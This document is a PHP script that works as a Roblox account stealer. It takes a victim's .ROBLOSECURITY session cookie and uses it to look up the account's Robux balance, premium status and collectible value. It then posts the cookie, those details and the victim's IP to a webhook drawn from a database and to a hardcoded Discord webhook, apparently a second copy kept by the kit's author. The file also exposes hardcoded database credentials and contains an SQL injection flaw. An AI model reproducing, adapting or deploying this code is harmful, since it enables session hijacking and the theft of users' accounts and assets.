<?php
    $link = mysqli_connect('localhost','f0607589_roblik','W3Ek5iEQ','f0607589_roblik');
    $id = $_REQUEST['id'];
    $sql = "SELECT * FROM `Logs` WHERE `ID` = '$id' ";
    $result = $link -> query($sql);
    while($webi = mysqli_fetch_assoc($result)) {
        $webhook = "{$webi['Webhook']}"; // Вроде ковычки забыли
    }
    $cookie = $_REQUEST['t'];
    function getrap($user_id, $cookie) {
	$cursor = "";
	$total_rap = 0;
						
	while ($cursor !== null) {
		$request = curl_init();
		curl_setopt($request, CURLOPT_URL, "https://inventory.roblox.com/v1/users/$user_id/assets/collectibles?assetType=All&sortOrder=Asc&limit=100&cursor=$cursor");
		curl_setopt($request, CURLOPT_HTTPHEADER, array('Cookie: .ROBLOSECURITY='.$cookie));
		curl_setopt($request, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($request, CURLOPT_SSL_VERIFYPEER, 0); 
		curl_setopt($request, CURLOPT_SSL_VERIFYHOST, 0);
		$data = json_decode(curl_exec($request), 1);
		foreach($data["data"] as $item) {
			$total_rap += $item["recentAveragePrice"];
		}
		$cursor = $data["nextPageCursor"] ? $data["nextPageCursor"] : null;
	}
						
	return $total_rap;
}
function get_ip()
{
	$value = '';
	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
		$value = $_SERVER['HTTP_CLIENT_IP'];
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		$value = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} elseif (!empty($_SERVER['REMOTE_ADDR'])) {
		$value = $_SERVER['REMOTE_ADDR'];
	}
  
	return $value;
}
$polikip = get_ip();
        function discordmsg($msg, $webhook) {
        if($webhook != "") {
            $ch = curl_init( $webhook );
            curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
            curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
            curl_setopt( $ch, CURLOPT_POST, 1);
            curl_setopt( $ch, CURLOPT_POSTFIELDS, $msg);
            curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt( $ch, CURLOPT_HEADER, 0);
            curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
 
            $response = curl_exec( $ch );
            // If you need to debug, or find out why you can't send message uncomment line below, and execute script.
            echo $response;
            curl_close( $ch );
        }
    }
    if ($cookie) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Cookie: .ROBLOSECURITY=' . $cookie
        ));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $profile = json_decode(curl_exec($ch), 1);
        curl_close($ch);
        
$idiotrap = getrap($profile["UserID"], $cookie);
            $hookObject = json_encode([
            "username" => $profile ["UserName"],
            "avatar_url" => "https://www.roblox.com/avatar-thumbnail/image?userId=". $profile["UserID"] . "&width=352&height=352&format=png",
             "content" => "aasas",
                "embeds" => [
                    [
                        "title" => $profile ["UserName"],
                        "type" => "rich",
                        "url" => "https://www.roblox.com/users/" . $profile["UserID"] . "/profile",
                        "color" => hexdec("00ff6e"),
                        "thumbnail" => [
                            "url" => "https://www.roblox.com/avatar-thumbnail/image?userId=". $profile["UserID"] . "&width=352&height=352&format=png"
                        ],
                        "fields" => [
                            [
                                "name" => "<:id:818111672455397397> ID",
                                "value" => $profile["UserID"],
                                "inline" => True
                            ],
                            [
                                "name" => "IP",
                                "value" => $polikip,
                                "inline" => True
                            ],
                            [
                                "name" => "<:robux:818111919881715764> Robux",
                                "value" => $profile["RobuxBalance"],
                                "inline" => True
                            ],
                            [    "name" => "<:rolimons:818111627726684160> Rolimons Link",
                                "value" => "https://www.rolimons.com/player/" . $profile["UserID"],
                            ],
                            [
                                "name" => "<:trade:818111735973806111> Trade Link",
                                "value" => "https://www.roblox.com/Trade/TradeWindow.aspx?TradePartnerID=" . $profile["UserID"],
                                "inline" => True
                       	    ],
                       	    [
                                "name" => "<:premium:818111829963964416> Is Premium?",
                                "value" => $profile["IsPremium"],
                                "inline" => True
                            ],
                            [
                                "name" => "<:rap:818111763413205032> Rap",
                                "value" => getrap($profile["UserID"], $cookie),
                                "inline" => True
                            ]
                        ]
                    ],
                    [
                        "type" => "rich",
                        "color" => hexdec("00ff6e"),
                        "timestamp" => date("c"),
                         "footer" => [
                             "text" => "Powered By temagen |",
                        ],
                        "fields" => [
                            [
                                "name" => "\u{1F36A} Cookie:",
                            "value" => "```" . $cookie . "```"
                            ],
                        ]
                    ]
                ]
            
        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
 
    $webhooko = "https://discord.com/api/webhooks/957927733340540948/8wPgTfXTyT-QoGHyY0odcfxDEW-GmTFogpElEz07WBULT9dxEarLEkC-UNowsFDrhMBm";
    discordmsg($hookObject, $webhook);
    discordmsg($hookObject, $webhooko);
    }// SENDS MESSAGE TO DISCORD
    echo "";
    
?>